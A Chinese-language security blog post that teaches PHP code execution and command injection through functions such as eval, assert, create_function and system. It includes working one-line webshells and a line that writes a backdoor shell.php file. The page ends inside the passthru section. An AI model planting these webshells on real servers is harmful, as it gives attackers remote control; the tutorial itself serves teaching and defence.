<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noodp" />
    <title class="pjax-title">命令注入 - 高诺琪&#39;s Blog</title><meta name="Description" content="宁静致远"><meta property="og:title" content="命令注入" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://KohN0q1.github.io/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" /><meta property="og:image" content="https://KohN0q1.github.io/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-07-29T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-07-29T00:00:00+00:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://KohN0q1.github.io/logo.png"/>

<meta name="twitter:title" content="命令注入"/>
<meta name="twitter:description" content=""/>
<meta name="application-name" content="DoIt">
<meta name="apple-mobile-web-app-title" content="DoIt">

<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="canonical" href="https://KohN0q1.github.io/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" /><link rel="prev" href="https://KohN0q1.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" /><link rel="next" href="https://KohN0q1.github.io/sql%E6%B3%A8%E5%85%A5/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "命令注入",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/KohN0q1.github.io\/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5\/"
        },"genre": "posts","wordcount":  2083 ,
        "url": "https:\/\/KohN0q1.github.io\/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5\/","datePublished": "2020-07-29T00:00:00+00:00","dateModified": "2020-07-29T00:00:00+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "高诺琪"
            },"description": ""
    }
    </script></head>

<body header-desktop="auto" header-mobile="auto"><script type="text/javascript">
        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('dark' === 'light' || 'dark' === 'dark' || 'dark' === 'black') setTheme('dark'), saveTheme('dark'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
    </script>
    <div id="back-to-top"></div>
    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="高诺琪&#39;s Blog">高诺琪&#39;s Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friend/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="高诺琪&#39;s Blog">高诺琪&#39;s Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friend/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
            <div class="container"><div class="toc" id="toc-auto">
        <h2 class="toc-title">目录</h2>
        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
  <ul>
    <li><a href="#前言">前言</a></li>
    <li><a href="#代码执行">代码执行</a>
      <ul>
        <li><a href="#eval函数">eval函数</a></li>
        <li><a href="#assert函数">assert函数</a></li>
        <li><a href="#preg_replace函数">preg_replace函数</a></li>
        <li><a href="#create_function函数">create_function函数</a></li>
        <li><a href="#call_user_func函数">call_user_func函数</a></li>
        <li><a href="#call_user_func_array函数">call_user_func_array函数</a></li>
        <li><a href="#array_map函数">array_map函数</a></li>
      </ul>
    </li>
    <li><a href="#命令注入">命令注入</a>
      <ul>
        <li><a href="#system函数">system函数</a></li>
        <li><a href="#exec函数">exec函数</a></li>
        <li><a href="#shell_exec函数">shell_exec函数</a></li>
        <li><a href="#passthru函数">passthru函数</a></li>
      </ul>
    </li>
    <li><a href="#绕过姿势">绕过姿势</a>
      <ul>
        <li><a href="#空格绕过">空格绕过</a></li>
        <li><a href="#符号绕过">符号绕过</a></li>
        <li><a href="#通配符绕过">通配符绕过</a></li>
        <li><a href="#关键字绕过">关键字绕过</a></li>
      </ul>
    </li>
    <li><a href="#参考">参考</a></li>
  </ul>
</nav></div>
    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">命令注入</h1><div class="post-meta">
            <div class="post-meta-line">
                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">高诺琪</a>
                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-07-29">2020-07-29</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2020-07-29">2020-07-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2083 字&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#前言">前言</a></li>
    <li><a href="#代码执行">代码执行</a>
      <ul>
        <li><a href="#eval函数">eval函数</a></li>
        <li><a href="#assert函数">assert函数</a></li>
        <li><a href="#preg_replace函数">preg_replace函数</a></li>
        <li><a href="#create_function函数">create_function函数</a></li>
        <li><a href="#call_user_func函数">call_user_func函数</a></li>
        <li><a href="#call_user_func_array函数">call_user_func_array函数</a></li>
        <li><a href="#array_map函数">array_map函数</a></li>
      </ul>
    </li>
    <li><a href="#命令注入">命令注入</a>
      <ul>
        <li><a href="#system函数">system函数</a></li>
        <li><a href="#exec函数">exec函数</a></li>
        <li><a href="#shell_exec函数">shell_exec函数</a></li>
        <li><a href="#passthru函数">passthru函数</a></li>
      </ul>
    </li>
    <li><a href="#绕过姿势">绕过姿势</a>
      <ul>
        <li><a href="#空格绕过">空格绕过</a></li>
        <li><a href="#符号绕过">符号绕过</a></li>
        <li><a href="#通配符绕过">通配符绕过</a></li>
        <li><a href="#关键字绕过">关键字绕过</a></li>
      </ul>
    </li>
    <li><a href="#参考">参考</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="前言" class="headerLink">
    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h2><p>首先需要注意：命令注入（command Injection）和远程代码执行RCE（remote command/code execute）是不同的。远程代码执行是调用服务器使用的后端代码（如PHP PYTHON JAVA）进行执行，而命令注入则是调用系统(linux windows)命令进行执行。
<br/></p>
<h2 id="代码执行" class="headerLink">
    <a href="#%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" class="header-mark"></a>代码执行</h2><p>常见的PHP代码命令函数：</p>
<ul>
<li>assert</li>
<li>eval</li>
<li>preg_replace</li>
<li>call_user_func</li>
<li>call_user_func_array</li>
<li>array_map</li>
<li>&hellip;
<br/></li>
</ul>
<h3 id="eval函数" class="headerLink">
    <a href="#eval%e5%87%bd%e6%95%b0" class="header-mark"></a>eval函数</h3><p><code>eval ( string $code ) : mixed</code>
eval() 函数把字符串按照 PHP 代码来执行，该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nx">phpinfo</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>常见的一句话木马也是采用<code>eval</code>函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>写shell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w+&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br/>
<h3 id="assert函数" class="headerLink">
    <a href="#assert%e5%87%bd%e6%95%b0" class="header-mark"></a>assert函数</h3><p><code>assert ( mixed $assertion [, Throwable $exception ] ) : bool</code>
assert检查一个断言是否为 FALSE，如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">assert</span><span class="p">(</span><span class="nx">phpinfo</span><span class="p">());</span> <span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>注意：在PHP7中assert变成了一种语言结构而不是一个函数，不在支持可变函数，意味着不再支持<code>?a=assert&amp;b=phpinfo()</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>  
</span></span><span class="line"><span class="cl"><span class="c1">//php5可以正常运行，php7无法使用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span> <span class="c1">//assert
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$b</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">];</span> <span class="c1">//phpinfo()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><br/>
<h3 id="preg_replace函数" class="headerLink">
    <a href="#preg_replace%e5%87%bd%e6%95%b0" class="header-mark"></a>preg_replace函数</h3><p><code>preg_replace(mixed $pattern，mixed $replacement，mixed $subject[，int $limit = -1 [,int &amp;$count]]):mixed</code>
preg_replace执行一个正则表达式的搜索和替换，当$pattern为/e，会把replacement参数当成PHP代码执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/test/e&#34;</span><span class="p">,</span><span class="s2">&#34;phpinfo();&#34;</span><span class="p">,</span><span class="s2">&#34;test&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>注： PHP 5.5.0 起， 传入 &ldquo;\e&rdquo; 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 &ldquo;\e&rdquo; 也无法起效。 
<br/></p>
<h3 id="create_function函数" class="headerLink">
    <a href="#create_function%e5%87%bd%e6%95%b0" class="header-mark"></a>create_function函数</h3><p><code>string create_function ( string $args， string $code )</code>
创建一个匿名函数，create_function函数会在内部执行eval()</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$newfunc</span> <span class="o">=</span> <span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;$a,$b&#39;</span><span class="p">,</span> <span class="s1">&#39;return &#34;$a + $b = &#34; . ($a + $b);&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$newfunc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span> <span class="c1">// 1+2=3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>等价于</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">lambda</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$b</span><span class="p">){</span> 
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="s2">&#34;</span><span class="si">$a</span><span class="s2">+</span><span class="si">$b</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="p">(</span><span class="nv">$a</span><span class="o">+</span><span class="nv">$b</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">lambda</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>可以利用该函数构造webshell，<code>?cmd=phpinfo();</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nv">$func</span> <span class="o">=</span><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="nv">$func</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>注：从PHP 7.2.0开始，create_function()被废弃
<br/></p>
<h3 id="call_user_func函数" class="headerLink">
    <a href="#call_user_func%e5%87%bd%e6%95%b0" class="header-mark"></a>call_user_func函数</h3><p><code> call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed</code>
call_user_func 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$callback</span><span class="o">=</span> <span class="s1">&#39;system&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$parameter</span> <span class="o">=</span> <span class="s1">&#39;ls&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="nv">$parameter</span><span class="p">);</span> <span class="c1">//system(&#34;ls&#34;)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>利用方式：<code>?cmd=phpinfo()</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nx">assert</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><br/>
<h3 id="call_user_func_array函数" class="headerLink">
    <a href="#call_user_func_array%e5%87%bd%e6%95%b0" class="header-mark"></a>call_user_func_array函数</h3><p><code>call_user_func_array ( callable $callback , array $param_arr ) : mixed</code>
把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">call_user_func_array</span><span class="p">(</span><span class="s1">&#39;assert&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;phpinfo()&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>利用方式 <code>?cmd=phpinfo()</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$array</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nx">call_user_func_array</span><span class="p">(</span><span class="s2">&#34;assert&#34;</span><span class="p">,</span><span class="nv">$array</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><br/>
<h3 id="array_map函数" class="headerLink">
    <a href="#array_map%e5%87%bd%e6%95%b0" class="header-mark"></a>array_map函数</h3><p><code> array_map ( callable $callback , array $array1 [, array $... ] ) : array</code>
array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数`形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;dir&#34;</span><span class="p">,</span><span class="s2">&#34;ping www.baidu.com&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">array_map</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">],</span><span class="nv">$array</span><span class="p">);</span><span class="c1">// ?cmd=system
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>利用方法： <code>?a=assert&amp;b=phpinfo();</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="nx">array_map</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$array</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><br/>
<h2 id="命令注入" class="headerLink">
    <a href="#%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5" class="header-mark"></a>命令注入</h2><p>常见的PHP命令注入</p>
<ul>
<li>system</li>
<li>exec</li>
<li>shell_exec</li>
<li>passthru</li>
<li>proc_open</li>
<li>popen()</li>
<li>&hellip;
<br/></li>
</ul>
<h3 id="system函数" class="headerLink">
    <a href="#system%e5%87%bd%e6%95%b0" class="header-mark"></a>system函数</h3><p><code> system ( string $command [, int &amp;$return_var ] ) : string</code>
最常见的命令执行函数system，可以调用当前系统的命令，并且输出执行结果</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;ls&#34;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><br/>
<h3 id="exec函数" class="headerLink">
    <a href="#exec%e5%87%bd%e6%95%b0" class="header-mark"></a>exec函数</h3><p><code>exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) : string</code>
exec() 执行 command 参数所指定的命令。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><br/>
<h3 id="shell_exec函数" class="headerLink">
    <a href="#shell_exec%e5%87%bd%e6%95%b0" class="header-mark"></a>shell_exec函数</h3><p><code> shell_exec ( string $cmd ) : string</code>
通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回（当 PHP 运行在 安全模式 时，不能使用此函数。 ）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nx">shell_exec</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>注：反引号 ` ` 实际上就是调用该函数
<br/></p>
<h3 id="passthru函数" class="headerLink">
    <a href="#passthru%e5%87%bd%e6%95%b0" class="header-mark"></a>passthru函数</h3><p><code> passthru ( string $command [, int &amp;$return_var ] ) : void</code>
执行外部程序并且显示原始输出</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
